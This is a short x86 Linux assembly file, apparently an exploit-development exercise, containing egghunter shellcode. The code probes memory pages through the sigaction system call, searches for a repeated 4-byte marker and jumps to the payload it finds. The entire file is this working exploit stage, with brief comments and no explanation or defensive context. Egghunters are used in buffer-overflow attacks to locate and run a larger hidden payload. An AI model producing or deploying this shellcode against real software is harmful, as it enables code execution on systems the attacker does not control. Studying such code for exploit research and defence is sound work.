;
; sigtran egghunter
;

global _start

section .text
_start:

	or cx, 0xfff		; page allignment
	inc ecx			;
	push byte +0x43		; sigtran sys call number
	pop eax			; sys call into eax
	int 0x80		; make sys call
	cmp al, 0xf2		; check if memory is accessible
	jz $-0xd		; if memory is not accessible look into another page
	mov eax,0x50905292	; egg
	mov edi, ecx
	scasd
	jnz $-0x12		; 
	scasd			; string compare
	jnz $-0x15
	jmp edi			;

